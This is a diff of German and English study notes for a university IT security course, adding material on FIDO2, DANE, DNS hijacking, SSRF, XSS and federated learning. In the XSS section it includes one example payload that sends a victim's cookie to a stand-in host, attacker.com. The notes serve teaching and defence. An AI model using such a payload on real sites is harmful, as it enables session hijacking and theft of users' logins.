@@ -657,8 +657,6 @@ Unterscheidung:
    - passive Angreifer (nur abhören)  
    - aktive Angreifer (Kanal beeinflussen)
 
-
-
 ## Authentisierung
 ### 3 Faktoren zur Authentisierung – Übersicht
 
@@ -675,6 +673,16 @@ Unterscheidung:
 4. Rainbow Table: benutzen Hashfunktion H: Passwort → Hash und Reduktionsfunktion R: Hash → Passwort, um eine Kette für jede Passwörtern zu erstellen. Aber es Time-Memorz Tradeoff gibt: je länger die Ketten, desto weniger Speicherbedarf, aber desto mehr Zeitaufwand
 5. Salted Hashing: wähle zufälligen Salt S, mit mindestens 64 Bits, speichere H(S||pwd) in Passwort.
 6. Peppering: verhält wie Salted Hashing, aber Salt(s) geheim halten (nicht zusammen mit den Hashes in der DB steht.
+
+**Fast Identity Online (FIDO/2)**: is a new standard that aims to reduce reliance on passwords for authentication, relies on asymmetric cryptogrphy to replace password-based authentication
+<img width="632" height="211" alt="Bildschirmfoto 2026-03-02 um 11 27 21" src="https://github.com/user-attachments/assets/be04f45d-1681-4812-bf66-6e9ee0e6ca95" />
+
+- Vorteile:
+  + MFA Support
+  + Phising Resistant: no more logins to steal
+  + Replay Resistant: every challenge is different
+  + Service Specific: unique credentials per platform
+  + Multi-Devicesynchronize your credentials across devices
 
 **Tokens**
 Es existiert 2 **Arten von Token**: *Software*- (bsp. Web-Cookies) und *Hardware*-Token (bsp. Autoschlüssel), ansonsten betrachten wir auch 2 **Eigenschaften von Token**: *statisch* (bsp. einfache Überstragung des Geheimnisses) und *dynamisch* (Berechnung mit Geheimnis zur Authentisierung). Mithilfe von dynamisches Token können wir **Replay-Angriffe** vorbeugen.
@@ -867,7 +875,7 @@ Adressspeicher eines Switches mit vielen gefälschten Einträgen füllt. Ist die
 - **IPSec**:
    + ist ein Protokoll auf Internet-Layer zur Absicherung von IPv4 und IPv6
    + es sichert Kommunikation auf der Network-/IP-Schicht ab, die Schutz ist unabhängig von TCP/UDP-Anwendung und transparente Abischerung zwischen Hosts oder Gateways
-   + **Internet Key Exchange (IKE)** ist das Kontrollprotokoll von IPSec, dient zur beidsseitigen Authentifikstion zur Etablierung einer IKE SA mit shared secret und Algorithmen für AH/ESP und dem Schlüsselaustausch (Request/Response-Paaren - "exchanges"): *IKE_SA_INIT*: Verhandlung der Sicherheitsparameter für SA, Senden von Nonces und DH-Werten, und *IKE_AUTH*: Übertragung von Identitäten, Authentifizierung, Etablierung der SA
+   + **Internet Key Exchange (IKE)** ist das Kontrollprotokoll von IPSec, dient zur beidsseitigen Authentifikation zur Etablierung einer IKE SA mit shared secret und Algorithmen für AH/ESP und dem Schlüsselaustausch (Request/Response-Paaren - "exchanges"): *IKE_SA_INIT*: Verhandlung der Sicherheitsparameter für SA, Senden von Nonces und DH-Werten, und *IKE_AUTH*: Übertragung von Identitäten, Authentifizierung, Etablierung der SA
    + Sicherheitsziele:
      * Vertraulichkeit der IP-Payload Datenübertragung
      * Integrität
@@ -1087,6 +1095,11 @@ $\mathrm{fin}_C$ und $\mathrm{fin}_S$ wirken als Message Authentication Code (MA
        * increased administrative overhead
        * both server and client need to support it
        * only experimental support in stub resolvers and forwardeers
+     + **DANE**: is used to tie PKIX to DNSSEC; DANE'sTLSE record used to either:
+       1. 0: pin a Web PKI CA, or
+       2. 1: pin a Web PKI cert, or
+       3. 2: replace Web PKI CA with private CA
+       4. 3: replace Web PKI cert with own cert
      + **Vergleich Trust Chain**:
        - WebPKI: Kette von Zertifikaten bis Root im Trust Store.
        - DNSSEC: Kette über Delegation/Signaturen im DNS-Baum bis zum Root-Trust-Anchor.
@@ -1223,6 +1236,7 @@ $\mathrm{fin}_C$ und $\mathrm{fin}_S$ wirken als Message Authentication Code (MA
        12. Domain Hijacking (auf DNS)
            - Übernahme von Nutzerkonten bei Domain-Registraren
            - Angreifer kann dann legitimiert Werte im autoritativen Server anpassen
+           - 2 Types: IP-based (Attacker creates cloud resources, hoping to be assigned IP address that is used by Domain owner for the DNS record), and VHOST-based (Attacker recreates cloud resource used for DNS record; countermeasure: randomize virtual hostnames, and purge stale DNS records)
        13. Flooding-Angriff gegen DNS-Server
            - Üblicherweise durch kompromittierte Computer in einem Botnetz: Bot Master instruiert die Bots, den Zielserver mit Anfragen zu fluten bis aufgrund von Überlast der Dienst versagt
        14. Zensur des DNS
@@ -1433,15 +1447,17 @@ So zum Schluss wissen wir, dass ohne Cookies gibt es keine bequeme Sessions/Logi
 
 Jetzt lernen wir kennen, wie Angreifer die Bausteine von dem Web und der Webseiten missbrauchen kann. Wir gewöhnen uns an *Cross-Site Request Forgery (CSRF)*, *Cross-Site Scripting (XSS)*, und *SQL Injection* an:
 
-**CSRF**
-- Ziel: Im Namen eines eingeloggten Opfers eine Aktion auf einer fremden Website ausführen, ohne dass das Opfer das wirklich will oder merkt.
+**Cross-Site Request Forgery (CSRF)**
+- Ziel: Im Namen eines eingeloggten Opfers eine Aktion auf einer fremden Website ausführen, ohne dass das Opfer das wirklich will oder merkt. (Angriff auf Ofer-Browser)
 - nutzt aus, dass Browser Cookies automatisch mitsendet
 - Idee: Angreifer bringt ein eingeloggtes Opfer dazu, ungewollte Requests an eine Seite zu schicken. Browser hängt automatisch Cookies an, so wirkt es wie legitime Anfrage vom Opfer
 - Typischer Ablauf:
-  1. Benutyer authentiziert sich gegenüber Server, Benutzer dann enthält Session-Cookie
+  1. Benutzer authentiziert sich gegenüber Server, Benutzer dann enthält Session-Cookie
   2. Angeifer bringt den Benutzer dazu, eine ungewollte Anfrage an Server zu schicken
   3. Server akzeptiert ungewollte Anfrage von Benutzer
-**Gut zu merken**: Dieser Angriff nutzt automatisches Mitsenden von Cookies; funktioniert auch über Social Engineering: Opfer auf einen Link klicken, oder boshaftes HTML auf Webeite einbinden, die  Opfer besucht 
+**Gut zu merken**: Dieser Angriff nutzt automatisches Mitsenden von Cookies; funktioniert auch über Social Engineering: Opfer auf einen Link klicken, oder boshaftes HTML auf Webeite einbinden, die  Opfer besucht
+<img width="466" height="312" alt="Bildschirmfoto 2026-03-02 um 11 35 36" src="https://github.com/user-attachments/assets/ae3367a2-f506-4029-a8de-3727f72f9fbd" />
+
 - Gegenmaßnahmen:
   1. CSRF Tokens: eine Server-seitig Gegenmaßnahme
      - Server generiert zufälliges Token, bettet es in HTML-Seite ein
@@ -1454,24 +1470,29 @@ Jetzt lernen wir kennen, wie Angreifer die Bausteine von dem Web und der Webseit
      - Setze "SameSite = Strict", werden Cookies nur bei gleichen Domain-Kontexten gesendet
      - erschwert CSRF, aber muss korrekt konfiguriert sein
 
-**XSS**
-- Ziel: schädliches JS in eine legitime Seite einschleusen, dass der Browser es im Kontext dieser Seite ausführt // umgehen mit Same-Origin Policy
+**Server-Side Request Forgecy (SSRF)**
+- In complex server architectures, servers often make requests to different backand APIs; SSRF is possible when API endpoint can be modified by user
+<img width="442" height="302" alt="Bildschirmfoto 2026-03-02 um 11 39 57" src="https://github.com/user-attachments/assets/b2d93fdb-3957-469f-abb8-02a98c10a4d2" />
+
+**Cross-Site Scripting (XSS)**
+- Ziel: schädliches JS in eine legitime Seite einschleusen, dass der Browser es im Kontext dieser Seite ausführt, kann mit Same-Origin Policy umgehen.
+- Beispiel: <script>document.location= 'http://attacker.com/' + document.cookie</script>
 - Prinzip:
   1. Angreifer injiziert schädlicher Code in Webseite
   2. Opfer macht Anfrage und enthält HTML-Antwort mit schädlichem Code
 - Varianten von XSS:
   1. Reflected XSS (non-persistent)
-     - Idee: Schädliche Daten kommen im Request, Server reflektiert sie direkt in der Antwort
+     - Idee: Schädliche Daten kommen im Request, Server reflektiert sie direkt in der Antwort; wird nicht von Server gespeichert
      - Voraussetzung: Opfer macht aelbst Anfrage mit schädlichem Code
   2. Persistent XSS:
-     - Idee: Anfrage von Angreifer veranlasst Server den schädlichen Code dauerhaft zu speichern, Opfer lädt dann Seite von Server mit schädlichem Code
+     - Idee: Anfrage von Angreifer veranlasst Server den schädlichen Code dauerhaft zu speichern, Opfer lädt dann Seite von Server mit schädlichem Code; wird von Server gespeichert, und wird jedem Besucher zugestellt
 - Gegenmaßnahmen:
   1. Input-Filter/Validierung: Jede Eingabe werden als potenziell schädlich behandelt
   2. HTML-Escaping/Sanitization: spezielle Zeichen furch eine Sequenz aus Zeichen anstatt von reinem HTML dargestellt, startet mit & und beendet mit ;
   3. Content Securitz Policy (SCP)
      - Idee: HTTP Header teilt mit dem Webserver dem Browser mit, welche dynamischen Ressourcen
      - verhindert Inline-JS und Fremd-Domänen
-    
+
 **SQL Injection**
 Was ist **SQL**: steht für Structured Query Language, ist eine Sprach, um mit Datenbank zu interagieren
 - Voraussetzung von dem Angriff: User-Eingabe wird direkt in SQL eingebaut
@@ -1705,7 +1726,16 @@ Wie man erschwert die Angriffe?
            4. Der Server aggregiert die Updates (z. B. durch Mittelwertbildung) und erstellt ein neues globales Modell.
            5. Der Prozess wiederholt sich iterativ.
              → Daten bleiben lokal, nur Modellparameter werden geteilt.
+<img width="433" height="242" alt="Bildschirmfoto 2026-03-02 um 11 32 46" src="https://github.com/user-attachments/assets/1a972c79-c6c1-47ca-a8d7-ecdbf0ffdc61" />
+
          * Vorteile:
+           1. Privacy preserving
+           2. Secure data
+           3. Scalability
+           4. Reduced communication costs
+           5. Real-time adaptability
+           6. Data diversity
+         * Nachteile:
            1. Modell-Updates können Informationen über Trainingsdaten leaken
            2. Membership-Inference-Angriffe möglich
            3. Insider-Angreifer können Updates analysieren
